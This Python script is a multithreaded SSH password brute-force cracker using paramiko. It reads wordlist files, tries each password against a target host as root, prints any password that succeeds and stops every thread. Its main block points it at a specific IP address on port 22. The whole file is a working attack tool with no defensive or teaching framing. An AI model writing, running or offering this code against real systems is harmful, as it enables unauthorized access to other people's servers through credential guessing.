# -*- encoding: utf-8 -*-
import paramiko
import threading

class SSHThread(threading.Thread):
    thread_list = []

    @staticmethod
    def CrackSSH(host, port, dic_list, username):
        thread_index = 0
        ret = []
        for dic_lib in dic_list:
            thread_index += 1
            temp_thread = SSHThread(host, port, dic_lib, username, thread_index)
            temp_thread.start()
            SSHThread.thread_list.append(temp_thread)
            print("cracker thread:", thread_index, "has started")

    def __init__(self, host, port, dictionary, username, index):
        threading.Thread.__init__(self)
        self.host = host
        self.port = port
        self.dictionary = dictionary
        self.username = username

        self.index = index
        self.pwd_number = 0
        self.stop = False

    def __shutdown__(self):
        for cracker in SSHThread.thread_list:
            cracker.__stop__()
        print("all thread has shutdown.")

    def __stop__(self):
        self.stop = True

    def ssh_connect(self, password):
        self.ssh_value = {}
        self.ssh_value_success = []
        self.ssh_value_failed = []
        self.password = password

        self.pwd_number += 1
        if self.pwd_number % 10000 == 0:
            print("thread:", self.index, "-----", self.pwd_number)

        s = paramiko.SSHClient()
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            s.connect(self.host, self.port, self.username, self.password, timeout=300, banner_timeout=300, auth_timeout=300)
            print("The password {0} is success.".format(self.password))
            self.ssh_value_success.append(1)
            self.ssh_value_success.append(self.password)
            self.ssh_value['ssh_value_success'] = self.ssh_value_success
            self.__shutdown__()
            return True
        except Exception as e:
            self.ssh_value_failed.append(0)
            self.ssh_value['ssh_value_failed'] = self.ssh_value_failed
            return False

    def run(self):
        l1 = [ i.strip('\n') for i in open(self.dictionary, "r") ]
        pwd_index = 0
        
        while not self.stop:
            print(self.index, self.pwd_number, pwd_index, self.stop)

            password = l1[pwd_index]
            pwd_index += 1

            if pwd_index > len(l1) - 1:
                self.__stop__()

            self.ssh_connect(password)


if __name__ == '__main__':
    dic = ["/root/node.txt", "/root/node.txt"]
    SSHThread.CrackSSH("8.8.8.129", 22, dic, "root")
